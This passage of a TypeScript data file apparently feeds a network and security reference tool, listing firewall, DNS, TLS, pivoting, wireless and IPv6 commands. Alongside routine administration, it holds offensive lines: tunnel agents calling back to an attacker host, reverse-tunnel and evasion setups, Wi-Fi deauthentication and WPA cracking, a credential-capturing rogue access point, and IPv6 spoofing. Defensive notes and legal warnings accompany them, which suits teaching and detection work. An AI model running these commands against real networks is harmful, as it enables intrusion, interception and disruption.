  { tool: 'iptables', category: 'View rules', cmd: 'iptables -L -n -v --line-numbers', description: 'List all rules with line numbers, no DNS, verbose (packet/byte counts)' },
  { tool: 'iptables', category: 'View rules', cmd: 'iptables -t nat -L -n -v', description: 'List NAT table rules (-t nat, -t mangle, -t raw)' },
  { tool: 'iptables', category: 'View rules', cmd: 'iptables-save', description: 'Dump all rules in save format (redirect to file for backup)' },
  { tool: 'iptables', category: 'View rules', cmd: 'iptables-restore < rules.v4', description: 'Restore rules from file' },
  { tool: 'iptables', category: 'Allow', cmd: 'iptables -A INPUT -p tcp --dport 22 -j ACCEPT', description: 'Allow inbound SSH' },
  { tool: 'iptables', category: 'Allow', cmd: 'iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT', description: 'Allow established/related connections (stateful)' },
  { tool: 'iptables', category: 'Allow', cmd: 'iptables -A INPUT -s 192.168.1.0/24 -j ACCEPT', description: 'Allow all traffic from subnet' },
  { tool: 'iptables', category: 'Allow', cmd: 'iptables -A INPUT -p tcp -m multiport --dports 80,443,8080 -j ACCEPT', description: 'Allow multiple ports in one rule' },
  { tool: 'iptables', category: 'Block', cmd: 'iptables -A INPUT -s 1.2.3.4 -j DROP', description: 'Block specific source IP (DROP = silent, REJECT = sends RST/ICMP)' },
  { tool: 'iptables', category: 'Block', cmd: 'iptables -A INPUT -p tcp --dport 23 -j REJECT --reject-with tcp-reset', description: 'Reject Telnet with TCP reset' },
  { tool: 'iptables', category: 'Block', cmd: 'iptables -P INPUT DROP', description: 'Default policy: drop all inbound (set AFTER adding allow rules)', notes: 'DANGER: locks you out if run remotely without prior allow rules for SSH' },
  { tool: 'iptables', category: 'NAT', cmd: 'iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE', description: 'Enable NAT/masquerade on eth0 (for routing/forwarding)' },
  { tool: 'iptables', category: 'NAT', cmd: 'iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.10:8080', description: 'Port forward: redirect inbound :80 to internal host :8080' },
  { tool: 'iptables', category: 'Logging', cmd: 'iptables -A INPUT -j LOG --log-prefix "iptables-drop: " --log-level 4', description: 'Log dropped packets (add BEFORE DROP rule)', notes: 'Logs to /var/log/kern.log or syslog. Log-level 4=warning' },
  { tool: 'iptables', category: 'Management', cmd: 'iptables -D INPUT 3', description: 'Delete rule by line number' },
  { tool: 'iptables', category: 'Management', cmd: 'iptables -F', description: 'Flush (delete) all rules in default table', notes: 'Does NOT reset default policies — combine with -P INPUT ACCEPT first' },
  { tool: 'iptables', category: 'Management', cmd: 'iptables -Z', description: 'Zero packet/byte counters' },
  // nftables
  { tool: 'nftables', category: 'View rules', cmd: 'nft list ruleset', description: 'Show complete nftables ruleset' },
  { tool: 'nftables', category: 'View rules', cmd: 'nft list tables', description: 'List all tables' },
  { tool: 'nftables', category: 'View rules', cmd: 'nft list chain ip filter input', description: 'List specific chain' },
  { tool: 'nftables', category: 'Setup', cmd: 'nft add table ip filter', description: 'Create table', notes: 'Families: ip, ip6, inet (both), arp, bridge' },
  { tool: 'nftables', category: 'Setup', cmd: 'nft add chain ip filter input { type filter hook input priority 0 \\; policy drop \\; }', description: 'Create input chain with drop default' },
  { tool: 'nftables', category: 'Allow', cmd: 'nft add rule ip filter input tcp dport 22 accept', description: 'Allow SSH inbound' },
  { tool: 'nftables', category: 'Allow', cmd: 'nft add rule ip filter input ct state established,related accept', description: 'Allow established connections' },
  { tool: 'nftables', category: 'Allow', cmd: 'nft add rule inet filter input tcp dport { 80, 443, 8080 } accept', description: 'Allow multiple ports (sets notation)' },
  { tool: 'nftables', category: 'Block', cmd: 'nft add rule ip filter input ip saddr 1.2.3.4 drop', description: 'Block source IP' },
  { tool: 'nftables', category: 'Block', cmd: 'nft add rule ip filter input ip saddr { 1.2.3.4, 5.6.7.8 } drop', description: 'Block multiple IPs using set' },
  // Windows Firewall
  { tool: 'Windows Firewall', category: 'View rules', cmd: 'netsh advfirewall show allprofiles', description: 'Show all firewall profile states (Domain/Private/Public)' },
  { tool: 'Windows Firewall', category: 'View rules', cmd: 'netsh advfirewall firewall show rule name=all', description: 'Show all firewall rules' },
  { tool: 'Windows Firewall', category: 'View rules', cmd: 'Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"} | Format-Table Name,Direction,Action', description: 'PowerShell: list enabled rules' },
  { tool: 'Windows Firewall', category: 'Allow', cmd: 'netsh advfirewall firewall add rule name="Allow SSH" protocol=TCP dir=in localport=22 action=allow', description: 'Allow inbound TCP 22' },
  { tool: 'Windows Firewall', category: 'Allow', cmd: 'New-NetFirewallRule -DisplayName "Allow HTTPS" -Direction Inbound -Protocol TCP -LocalPort 443 -Action Allow', description: 'PowerShell: add allow rule' },
  { tool: 'Windows Firewall', category: 'Block', cmd: 'netsh advfirewall firewall add rule name="Block Telnet" protocol=TCP dir=in localport=23 action=block', description: 'Block inbound Telnet' },
  { tool: 'Windows Firewall', category: 'Block', cmd: 'New-NetFirewallRule -DisplayName "Block IP" -Direction Inbound -RemoteAddress 1.2.3.4 -Action Block', description: 'PowerShell: block source IP' },
  { tool: 'Windows Firewall', category: 'Management', cmd: 'netsh advfirewall set allprofiles state off', description: 'Disable firewall on all profiles', notes: 'DANGEROUS — leaves system unprotected. Diagnostic use only.' },
  { tool: 'Windows Firewall', category: 'Management', cmd: 'netsh advfirewall set allprofiles state on', description: 'Enable firewall on all profiles' },
]

// ─── DNS Deep Dive ────────────────────────────────────────────────────────────

export interface DNSCommand {
  category: string
  tool: string
  cmd: string
  description: string
  notes?: string
}

export const dnsCommands: DNSCommand[] = [
  // dig basics
  { tool: 'dig', category: 'Basic queries', cmd: 'dig example.com', description: 'A record query (default)' },
  { tool: 'dig', category: 'Basic queries', cmd: 'dig example.com A', description: 'Explicit A record (IPv4)' },
  { tool: 'dig', category: 'Basic queries', cmd: 'dig example.com AAAA', description: 'IPv6 address record' },
  { tool: 'dig', category: 'Basic queries', cmd: 'dig example.com MX', description: 'Mail exchange records' },
  { tool: 'dig', category: 'Basic queries', cmd: 'dig example.com NS', description: 'Nameserver records' },
  { tool: 'dig', category: 'Basic queries', cmd: 'dig example.com TXT', description: 'TXT records (SPF, DKIM, verification tokens)' },
  { tool: 'dig', category: 'Basic queries', cmd: 'dig example.com SOA', description: 'Start of Authority — serial, refresh, expire, TTL' },
  { tool: 'dig', category: 'Basic queries', cmd: 'dig example.com CNAME', description: 'Canonical name (alias) record' },
  { tool: 'dig', category: 'Basic queries', cmd: 'dig -x 8.8.8.8', description: 'Reverse DNS lookup (PTR record)', notes: 'Expands to: dig 8.8.8.8.in-addr.arpa PTR' },
  { tool: 'dig', category: 'Basic queries', cmd: 'dig example.com ANY', description: 'All record types (many resolvers block this — use specific types instead)' },
  { tool: 'dig', category: 'Specific servers', cmd: 'dig @8.8.8.8 example.com', description: 'Query specific DNS server (Google Public DNS)' },
  { tool: 'dig', category: 'Specific servers', cmd: 'dig @1.1.1.1 example.com', description: 'Query Cloudflare resolver' },
  { tool: 'dig', category: 'Specific servers', cmd: 'dig @ns1.example.com example.com', description: 'Query authoritative nameserver directly' },
  { tool: 'dig', category: 'Output control', cmd: 'dig example.com +short', description: 'Short output — just the answer', notes: 'Great for scripting: IP=$(dig example.com +short | head -1)' },
  { tool: 'dig', category: 'Output control', cmd: 'dig example.com +noall +answer', description: 'Show only the answer section' },
  { tool: 'dig', category: 'Output control', cmd: 'dig example.com +stats', description: 'Include query statistics (time, server, size)' },
  { tool: 'dig', category: 'Output control', cmd: 'dig example.com +trace', description: 'Trace full resolution path from root servers', notes: 'Shows every hop: root → TLD → authoritative. Diagnostic for delegation issues.' },
  { tool: 'dig', category: 'Output control', cmd: 'dig example.com +dnssec', description: 'Request DNSSEC records (RRSIG, DNSKEY)' },
  // Zone transfer
  { tool: 'dig', category: 'Zone transfer', cmd: 'dig @ns1.example.com example.com AXFR', description: 'Attempt full zone transfer (AXFR)', notes: 'Returns all DNS records if allowed. Well-secured domains restrict to authorized IPs only. AXFR exposed = full DNS inventory.' },
  { tool: 'dig', category: 'Zone transfer', cmd: 'dig @ns1.example.com example.com IXFR=2024010101', description: 'Incremental zone transfer since serial number' },
  // nslookup
  { tool: 'nslookup', category: 'Basic queries', cmd: 'nslookup example.com', description: 'Default A record lookup' },
  { tool: 'nslookup', category: 'Basic queries', cmd: 'nslookup -type=MX example.com', description: 'MX records' },
  { tool: 'nslookup', category: 'Basic queries', cmd: 'nslookup -type=ANY example.com 8.8.8.8', description: 'All records from specific server' },
  { tool: 'nslookup', category: 'Basic queries', cmd: 'nslookup 8.8.8.8', description: 'Reverse lookup' },
  // host
  { tool: 'host', category: 'Basic queries', cmd: 'host example.com', description: 'Simple forward lookup' },
  { tool: 'host', category: 'Basic queries', cmd: 'host -t MX example.com', description: 'MX record' },
  { tool: 'host', category: 'Basic queries', cmd: 'host -l example.com ns1.example.com', description: 'Zone transfer attempt (list all records)', notes: 'Equivalent to AXFR' },
  // DoH / DoT
  { tool: 'curl (DoH)', category: 'DNS over HTTPS', cmd: "curl -s 'https://cloudflare-dns.com/dns-query?name=example.com&type=A' -H 'accept: application/dns-json'", description: 'DNS over HTTPS query to Cloudflare', notes: 'Bypasses local DNS monitoring. Useful for testing and also as a detection consideration.' },
  { tool: 'curl (DoH)', category: 'DNS over HTTPS', cmd: "curl -s 'https://dns.google/resolve?name=example.com&type=A'", description: 'DNS over HTTPS via Google' },
  { tool: 'kdig (DoT)', category: 'DNS over TLS', cmd: 'kdig -d @1.1.1.1 +tls example.com', description: 'DNS over TLS query (requires knot-dnsutils)', notes: 'kdig from knot-dnsutils package. +tls = DoT on port 853.' },
  // Enum/recon
  { tool: 'dig', category: 'Enumeration', cmd: 'for sub in www mail ftp vpn remote; do dig +short $sub.example.com; done', description: 'Simple subdomain brute-force loop' },
  { tool: 'dig', category: 'Enumeration', cmd: 'dig example.com TXT | grep -i "v=spf"', description: 'Extract SPF record' },
  { tool: 'dig', category: 'Enumeration', cmd: 'dig _dmarc.example.com TXT', description: 'Check DMARC policy' },
  { tool: 'dig', category: 'Enumeration', cmd: 'dig _domainkey.example.com TXT', description: 'DKIM public key (check specific selector: <selector>._domainkey)' },
]

// ─── TLS/SSL Testing ──────────────────────────────────────────────────────────

export interface TLSCommand {
  category: string
  cmd: string
  description: string
  notes?: string
}

export const tlsCommands: TLSCommand[] = [
  // openssl s_client
  { category: 'openssl s_client', cmd: 'openssl s_client -connect example.com:443', description: 'Basic TLS connection — shows certificate chain and handshake' },
  { category: 'openssl s_client', cmd: 'openssl s_client -connect example.com:443 -servername example.com', description: 'With SNI (required for vhosts — always include)', notes: 'Without -servername you may get a different cert on shared hosting' },
  { category: 'openssl s_client', cmd: 'openssl s_client -connect example.com:443 </dev/null 2>/dev/null | openssl x509 -noout -text', description: 'Show full certificate details (subject, SAN, validity, key)' },
  { category: 'openssl s_client', cmd: 'openssl s_client -connect example.com:443 </dev/null 2>/dev/null | openssl x509 -noout -fingerprint -sha256', description: 'Show SHA-256 certificate fingerprint' },
  { category: 'openssl s_client', cmd: 'openssl s_client -connect example.com:443 </dev/null 2>/dev/null | openssl x509 -noout -dates', description: 'Show certificate validity dates (notBefore, notAfter)' },
  { category: 'openssl s_client', cmd: 'openssl s_client -connect example.com:443 -tls1', description: 'Force TLS 1.0 connection attempt (check if server allows deprecated version)', notes: 'Also: -tls1_1, -tls1_2, -tls1_3, -ssl3 (should fail on all modern servers)' },
  { category: 'openssl s_client', cmd: 'openssl s_client -connect example.com:443 -cipher "RC4" 2>&1 | grep -i "cipher\\|error"', description: 'Test if server accepts specific weak cipher suite' },
  { category: 'openssl s_client', cmd: 'openssl s_client -connect example.com:443 -showcerts 2>/dev/null | openssl x509 -noout -subject -issuer', description: 'Show subject and issuer of leaf certificate' },
  { category: 'openssl s_client', cmd: 'echo | openssl s_client -connect example.com:465 -starttls smtp 2>/dev/null | openssl x509 -noout -subject', description: 'STARTTLS upgrade (also: -starttls ftp/imap/pop3/xmpp)' },
  // Certificate operations
  { category: 'Certificate ops', cmd: 'openssl x509 -in cert.pem -noout -text', description: 'Decode PEM certificate file — full details' },
  { category: 'Certificate ops', cmd: 'openssl x509 -in cert.pem -noout -subject -issuer -dates -fingerprint', description: 'Key fields only' },
  { category: 'Certificate ops', cmd: 'openssl x509 -in cert.pem -noout -ext subjectAltName', description: 'Show Subject Alternative Names (all valid hostnames)' },
  { category: 'Certificate ops', cmd: 'openssl verify -CAfile ca-bundle.pem cert.pem', description: 'Verify certificate against CA bundle' },
  { category: 'Certificate ops', cmd: "openssl x509 -in cert.pem -noout -checkend 86400", description: 'Check if cert expires within 86400 seconds (1 day)', notes: 'Exit code 0 = not expiring within window. Exit code 1 = expires soon.' },
  { category: 'Certificate ops', cmd: 'openssl crl2pkcs7 -nocrl -certfile cert.pem | openssl pkcs7 -print_certs -noout', description: 'Print all certs in a chain file' },
  // testssl.sh
  { category: 'testssl.sh', cmd: 'testssl.sh example.com', description: 'Comprehensive TLS scan — ciphers, protocols, vulnerabilities', notes: 'Install: git clone https://github.com/drwetter/testssl.sh.git' },
  { category: 'testssl.sh', cmd: 'testssl.sh --severity HIGH example.com', description: 'Show only HIGH and CRITICAL severity findings' },
  { category: 'testssl.sh', cmd: 'testssl.sh --protocols example.com', description: 'Test protocol support only (SSLv2/3, TLS 1.0/1.1/1.2/1.3)' },
  { category: 'testssl.sh', cmd: 'testssl.sh --ciphers example.com', description: 'Enumerate all accepted cipher suites' },
  { category: 'testssl.sh', cmd: 'testssl.sh --heartbleed --ccs-injection --ticketbleed example.com', description: 'Test for specific CVEs' },
  { category: 'testssl.sh', cmd: 'testssl.sh --json --outfile results.json example.com', description: 'JSON output for tooling' },
  // nmap TLS
  { category: 'nmap', cmd: 'nmap --script ssl-cert,ssl-enum-ciphers -p 443 example.com', description: 'Enumerate TLS certificate and all cipher suites' },
  { category: 'nmap', cmd: 'nmap --script ssl-heartbleed -p 443 example.com', description: 'Test for Heartbleed (CVE-2014-0160)' },
  { category: 'nmap', cmd: 'nmap --script ssl-poodle -p 443 example.com', description: 'Test for POODLE (SSLv3)' },
  { category: 'nmap', cmd: 'nmap --script ssl-dh-params -p 443 example.com', description: 'Check for weak DH params (Logjam)' },
  { category: 'nmap', cmd: 'nmap --script tls-alpn -p 443 example.com', description: 'Show ALPN protocols supported (h2, http/1.1)' },
]

// ─── Network Pivoting / Tunneling ────────────────────────────────────────────

export interface PivotTechnique {
  name: string
  category: string
  description: string
  commands: { label: string; cmd: string; notes?: string }[]
  useCases: string[]
  detectionIndicators: string[]
}

export const pivotTechniques: PivotTechnique[] = [
  {
    name: 'SSH Local Port Forward',
    category: 'SSH tunneling',
    description: 'Bind a local port → tunnel through SSH → connect to remote service. Access a service on the remote network as if it were local.',
    commands: [
      { label: 'Basic local forward', cmd: 'ssh -L 8080:target-host:80 user@ssh-pivot', notes: 'Connect to localhost:8080 → arrives at target-host:80 via ssh-pivot' },
      { label: 'Bind to all interfaces', cmd: 'ssh -L 0.0.0.0:8080:target-host:80 user@ssh-pivot', notes: 'Others on your network can also use the tunnel' },
      { label: 'No shell (tunnel only)', cmd: 'ssh -N -L 8080:target-host:80 user@ssh-pivot', notes: '-N = no command/shell. -f = background.' },
      { label: 'Multiple forwards', cmd: 'ssh -N -L 8080:web-server:80 -L 3306:db-server:3306 user@ssh-pivot', notes: 'Multiple -L flags in one connection' },
    ],
    useCases: ['Access internal web service behind firewall', 'Connect to internal database via jump host', 'Reach RDP on isolated host'],
    detectionIndicators: ['SSH connection with no interactive activity', 'Unusual TCP traffic from SSH client port', 'SSH session with -N flag (no shell spawned)'],
  },
  {
    name: 'SSH Remote Port Forward',
    category: 'SSH tunneling',
    description: 'Expose a local service on the remote SSH server. Remote machine can reach your local service via a bound port.',
    commands: [
      { label: 'Basic remote forward', cmd: 'ssh -R 9090:localhost:4444 user@remote-server', notes: 'Port 9090 on remote-server → your localhost:4444' },
      { label: 'Reverse shell catch', cmd: 'ssh -R 4444:localhost:4444 user@vps', notes: 'Catch reverse shell from inside a restricted network' },
      { label: 'GatewayPorts (server-side)', cmd: 'echo "GatewayPorts yes" >> /etc/ssh/sshd_config', notes: 'Allows remote forwards to bind on 0.0.0.0 (not just 127.0.0.1)' },
    ],
    useCases: ['C2 callback through restrictive egress firewall', 'Expose internal service to internet via VPS'],
    detectionIndicators: ['Outbound SSH with -R flag', 'Unusual listening port on SSH server', 'SSH keepalive traffic without interactive commands'],
  },
  {
    name: 'SSH Dynamic SOCKS Proxy',
    category: 'SSH tunneling',
    description: 'Turn SSH into a SOCKS4/5 proxy — route arbitrary TCP traffic through the SSH connection into the remote network.',
    commands: [
      { label: 'Start SOCKS proxy', cmd: 'ssh -D 1080 -N user@ssh-pivot', notes: 'SOCKS5 proxy on localhost:1080 — route all traffic through ssh-pivot' },
      { label: 'With proxychains', cmd: 'proxychains nmap -sT -Pn 192.168.1.0/24', notes: 'Run nmap through the proxy. Edit /etc/proxychains.conf: socks5 127.0.0.1 1080' },
      { label: 'Browser proxy', cmd: 'ssh -D 1080 -N -f user@ssh-pivot', notes: 'Set browser SOCKS5 proxy to 127.0.0.1:1080 to browse internal sites' },
      { label: 'ProxyChains config', cmd: "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf", notes: 'Add to proxychains config — runs any tool through the tunnel' },
    ],
    useCases: ['Enumerate entire internal network via single SSH pivot', 'Browse internal sites through tunnel'],
    detectionIndicators: ['High-volume diverse traffic over single SSH connection', 'Proxychains signature in tool connections', 'SOCKS CONNECT requests visible if SSL inspected'],
  },
  {
    name: 'Chisel',
    category: 'HTTP tunneling',
    description: 'TCP/UDP tunneling over HTTP. Bypasses firewalls that allow web traffic but block other protocols. Go binary — easy to deploy.',
    commands: [
      { label: 'Server (attacker)', cmd: './chisel server --port 8080 --reverse', notes: 'Start chisel server on your machine. --reverse enables reverse tunnels from client.' },
      { label: 'Client forward tunnel', cmd: './chisel client 10.0.0.1:8080 3306:internal-db:3306', notes: 'Forward localhost:3306 → internal-db:3306 via HTTP tunnel' },
      { label: 'Client reverse tunnel', cmd: './chisel client 10.0.0.1:8080 R:4444:127.0.0.1:4444', notes: 'R: prefix = reverse tunnel. Port 4444 on server → client localhost:4444' },
      { label: 'SOCKS via chisel', cmd: './chisel client 10.0.0.1:8080 socks', notes: 'Create SOCKS5 proxy (port 1080) through HTTP tunnel. Use with proxychains.' },
      { label: 'Over HTTPS', cmd: './chisel server --port 443 --tls-key key.pem --tls-cert cert.pem --reverse', notes: 'Run chisel over HTTPS for better evasion' },
    ],
    useCases: ['Pivot when only HTTP/S egress is allowed', 'Bypass DPI that blocks raw TCP', 'Tunnel when SSH is not available'],
    detectionIndicators: ['HTTP traffic with unusually high data volume', 'WebSocket upgrade in HTTP headers', 'Persistent HTTP connection to unusual external host', 'Chisel user-agent string in HTTP headers'],
  },
  {
    name: 'Ligolo-ng',
    category: 'TUN tunneling',
    description: 'Advanced pivoting tool — creates a TUN interface on the attacker machine. More seamless than proxychains — tools work normally without proxy awareness.',
    commands: [
      { label: 'Start proxy (attacker)', cmd: './proxy -selfcert -laddr 0.0.0.0:11601', notes: 'Proxy server on attacker machine listening for agent connections' },
      { label: 'Run agent (pivot host)', cmd: './agent -connect attacker-ip:11601 -ignore-cert', notes: 'Deploy agent binary on pivot host. Connects back to proxy.' },
      { label: 'Add interface (proxy console)', cmd: 'interface_add -i <session>', notes: 'In ligolo-ng console: creates tun0 on attacker' },
      { label: 'Add route (attacker OS)', cmd: 'ip route add 192.168.2.0/24 dev ligolo', notes: 'Route internal subnet through ligolo tunnel interface' },
      { label: 'Port forward via listener', cmd: 'listener_add -addr 0.0.0.0:1234 -to 192.168.2.10:3389', notes: 'Forward port on pivot to internal RDP host' },
    ],
    useCases: ['Full network pivot without proxychains', 'Nmap UDP scans through pivot (proxychains cannot do UDP)'],
    detectionIndicators: ['TLS connection from internal host to external on unusual port', 'Periodic keepalive traffic', 'Agent binary on pivot host'],
  },
  {
    name: 'ProxyChains',
    category: 'Proxy routing',
    description: 'Force any TCP tool through SOCKS4/5 or HTTP proxy. Requires a proxy (SSH -D, chisel socks, etc.) already established.',
    commands: [
      { label: 'Run tool through proxy', cmd: 'proxychains nmap -sT -Pn -p 22,80,443 192.168.1.100', notes: 'Must use -sT (connect scan) — SYN scan requires raw sockets' },
      { label: 'proxychains4 strict chain', cmd: 'proxychains4 -f /etc/proxychains4.conf curl http://internal-site', notes: 'strict_chain = all proxies must work. dynamic_chain = skips failed.' },
      { label: 'DNS through proxy', cmd: 'proxychains4 -q nslookup internal.domain.local 192.168.1.1', notes: '-q = quiet (suppress proxy output). DNS must go through proxy too.' },
      { label: 'Config snippet', cmd: '[ProxyList]\nsocks5  127.0.0.1  1080\n# or chain multiple:\n# socks5 10.0.0.1 1080\n# socks4 10.0.0.2 1080', notes: '/etc/proxychains.conf or /etc/proxychains4.conf' },
    ],
    useCases: ['Run existing tools through established tunnel without modification'],
    detectionIndicators: ['Tool connects via SOCKS (visible in proxy logs)', 'Non-browser SOCKS traffic', 'DNS-over-SOCKS queries'],
  },
]

// ─── Wireless Reference ───────────────────────────────────────────────────────

export interface WirelessCommand {
  category: string
  cmd: string
  description: string
  notes?: string
  legalWarning?: boolean
}

export const wirelessCommands: WirelessCommand[] = [
  // Monitor mode
  { category: 'Monitor mode', cmd: 'airmon-ng start wlan0', description: 'Enable monitor mode (creates wlan0mon)', notes: 'May need to kill conflicting processes first: airmon-ng check kill' },
  { category: 'Monitor mode', cmd: 'airmon-ng stop wlan0mon', description: 'Disable monitor mode' },
  { category: 'Monitor mode', cmd: 'iw dev wlan0 set type monitor', description: 'Enable monitor mode via iw (alternative method)' },
  { category: 'Monitor mode', cmd: 'iwconfig wlan0mon channel 6', description: 'Set monitor interface to specific channel' },
  // Discovery
  { category: 'Discovery', cmd: 'airodump-ng wlan0mon', description: 'Scan all channels — discover APs and clients', notes: 'Columns: BSSID, PWR, Beacons, Data, CH, ENC, CIPHER, AUTH, ESSID' },
  { category: 'Discovery', cmd: 'airodump-ng --band a wlan0mon', description: 'Scan 5 GHz band only (--band bg = 2.4 GHz, --band abg = both)' },
  { category: 'Discovery', cmd: 'airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon', description: 'Lock to specific channel and BSSID — see only that AP and its clients' },
  { category: 'Discovery', cmd: 'airodump-ng -c 6 -w capture --bssid AA:BB:CC:DD:EE:FF wlan0mon', description: 'Capture packets for specific AP to file (for WPA handshake capture)' },
  { category: 'Discovery', cmd: 'wash -i wlan0mon', description: 'Scan for WPS-enabled APs (wash from reaver suite)', notes: 'WPS-enabled APs are vulnerable to Pixie Dust and brute-force attacks.' },
  // WPA2 handshake
  { category: 'WPA2 handshake', cmd: 'aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon', description: 'Send 5 deauth frames to client — forces WPA re-authentication (handshake capture)', notes: '-0 = deauth attack. -a = AP BSSID. -c = client MAC. Must be running airodump-ng capture simultaneously.', legalWarning: true },
  { category: 'WPA2 handshake', cmd: 'aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon', description: 'Broadcast deauth (no -c) — disconnects all clients from AP', legalWarning: true, notes: 'Disrupts all clients on the AP. Broadcasting deauth is illegal on networks you do not own.' },
  { category: 'WPA2 handshake', cmd: 'aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap', description: 'Crack WPA2 handshake with wordlist', notes: 'Handshake must be captured first. Wordlist: rockyou.txt as starting point.' },
  { category: 'WPA2 handshake', cmd: 'hcxdumptool -i wlan0mon -o capture.pcapng --active_beacon', description: 'Capture PMKID without needing a client connected (PMKID attack)', notes: 'Requires hcxdumptool. Extracts PMKID from AP beacon — no deauth needed.' },
  { category: 'WPA2 handshake', cmd: 'hcxpcapngtool -o hash.hc22000 capture.pcapng', description: 'Convert pcapng to hashcat format (mode 22000)' },
  { category: 'WPA2 handshake', cmd: 'hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule', description: 'Crack PMKID/WPA2 with hashcat', notes: 'Mode 22000 handles both PMKID and EAPOL handshake. Much faster than aircrack-ng on GPU.' },
  // Rogue AP detection
  { category: 'Rogue AP detection', cmd: 'airodump-ng wlan0mon | grep -v "^$" | awk \'{print $1,$14}\'', description: 'List all BSSIDs and ESSIDs — compare against known inventory' },
  { category: 'Rogue AP detection', cmd: 'iw dev wlan0 scan | grep -E "SSID|BSS|signal"', description: 'Quick scan without monitor mode — SSID, BSSID, signal strength' },
  { category: 'Rogue AP detection', cmd: 'kismet -c wlan0mon', description: 'Kismet passive wireless monitor — stores all seen devices to database', notes: 'Best tool for continuous wireless monitoring. Web UI on port 2501.' },
  { category: 'Rogue AP detection', cmd: 'hostapd-wpe hostapd-wpe.conf', description: 'Rogue AP with credential capture (WPE = Wireless Pwnage Edition)', legalWarning: true },
  // Evil twin / management
  { category: 'Packet injection', cmd: 'aireplay-ng --test wlan0mon', description: 'Test packet injection capability of adapter' },
  { category: 'Packet injection', cmd: 'aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon', description: 'Fake authentication to AP (needed before injection attacks)' },
  { category: 'Packet injection', cmd: 'aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b AA:BB:CC:DD:EE:FF wlan0mon', description: 'Interactive packet replay (ARP replay for WEP — legacy)', notes: 'WEP is deprecated. For historical/lab reference only.' },
]

// ─── IPv6 Reference ───────────────────────────────────────────────────────────

export interface IPv6Entry {
  category: string
  topic: string
  description: string
  examples: string[]
  notes: string
}

export const ipv6Entries: IPv6Entry[] = [
  {
    category: 'Addressing',
    topic: 'Address format',
    description: '128-bit address, 8 groups of 4 hex digits separated by colons. Leading zeros can be omitted in each group. One contiguous block of zeros can be replaced with ::',
    examples: ['Full: 2001:0db8:85a3:0000:0000:8a2e:0370:7334', 'Compressed: 2001:db8:85a3::8a2e:370:7334', 'Loopback: ::1 (= 0000:...:0001)', 'All zeros: :: (= 0000:...:0000)'],
    notes: ':: can only appear once in an address. /64 prefix is standard for LAN segments. /128 is a host route.',
  },
  {
    category: 'Addressing',
    topic: 'Address types',
    description: 'IPv6 has no broadcast. Uses unicast, multicast, and anycast instead.',
    examples: ['Unicast global: 2000::/3 (publicly routable, like IPv4 public)', 'Link-local: fe80::/10 (FE80:: – FEBF::, auto-configured, non-routable)', 'Unique local: fc00::/7 (FC00:: – FDFF::, like RFC 1918 private)', 'Multicast: ff00::/8 (FF02::1 = all nodes, FF02::2 = all routers)', 'Loopback: ::1/128'],
    notes: 'Every interface has a link-local address (fe80::) derived from MAC via EUI-64 or randomly. Link-local addresses are only valid on the local segment.',
  },
  {
    category: 'Addressing',
    topic: 'EUI-64 / SLAAC',
    description: 'Stateless Address Auto-Configuration — hosts generate their own global address from the network prefix + interface identifier.',
    examples: ['MAC: aa:bb:cc:dd:ee:ff', 'EUI-64: aabc:ccff:fedd:eeff (insert ff:fe, flip bit 6)', 'SLAAC address: 2001:db8::/64 prefix + EUI-64 = 2001:db8::a8bb:ccff:fedd:eeff', 'Privacy extension (RFC 4941): random IID, changes periodically'],
    notes: 'EUI-64 derived addresses embed the MAC address — privacy concern. RFC 4941 privacy extensions generate random IIDs. Windows and modern Linux use privacy extensions by default.',
  },
  {
    category: 'NDP vs ARP',
    topic: 'Neighbor Discovery Protocol',
    description: 'IPv6 replacement for ARP. Uses ICMPv6 messages instead of Ethernet broadcast.',
    examples: ['Router Solicitation (RS): host → FF02::2 (all routers) — "give me prefix"', 'Router Advertisement (RA): router → FF02::1 (all nodes) — "here is prefix/gateway"', 'Neighbor Solicitation (NS): FF02::1:FF<last 24 bits> — "who has this IPv6?"', 'Neighbor Advertisement (NA): unicast reply — "I have this IPv6"', 'Redirect: ICMPv6 type 137 — "use this better router"'],
    notes: 'NDP is stateless and unauthenticated (like ARP). Vulnerable to spoofing attacks: rogue RA attacks, neighbor cache poisoning. Mitigation: RA Guard on switches, SEND (Secure Neighbor Discovery — rarely deployed).',
  },
  {
    category: 'Commands',
    topic: 'Linux IPv6 commands',
    description: 'Standard tools with IPv6 support',
    examples: ['ip -6 addr show — show IPv6 addresses', 'ip -6 route show — IPv6 routing table', 'ip -6 neigh show — neighbor cache (ARP equivalent)', 'ping6 ::1 — IPv6 ping', 'ping6 -I eth0 fe80::1 — ping link-local (must specify interface)', 'traceroute6 2001:db8::1 — IPv6 traceroute', 'ss -6 -tuln — IPv6 listening ports', 'nmap -6 -sV 2001:db8::1 — nmap IPv6 scan'],
    notes: 'Many tools need explicit -6 flag. Link-local addresses require interface scope: fe80::1%eth0 (Linux) or fe80::1 -I eth0.',
  },
  {
    category: 'Attack vectors',
    topic: 'Rogue Router Advertisement',
    description: 'Send fake RA messages to redirect IPv6 default gateway to attacker. Hosts auto-configure using RA — no user interaction required.',
    examples: ['Tool: rtadvd, fake_router6, radvd (configured maliciously)', 'fake_router6 eth0 2001:db8::/64 — advertise rogue prefix', 'Hosts update their default gateway to attacker IPv6', 'All IPv6 traffic routes through attacker = MitM'],
    notes: 'Works even when hosts also have IPv4 — if attacker RA has higher preference, IPv6 traffic is hijacked. Detection: RA Guard on managed switches. Monitor for unexpected RA sources with NDPMon.',
  },
  {
    category: 'Attack vectors',
    topic: 'Neighbor Cache Poisoning',
    description: 'Equivalent of ARP poisoning for IPv6. Send fake Neighbor Advertisement to associate attacker MAC with target IPv6.',
    examples: ['parasite6 eth0 — Neighbor Advertisement poisoning tool', 'Advertise NA claiming to be the default router IPv6 address', 'All traffic to default gateway goes through attacker'],
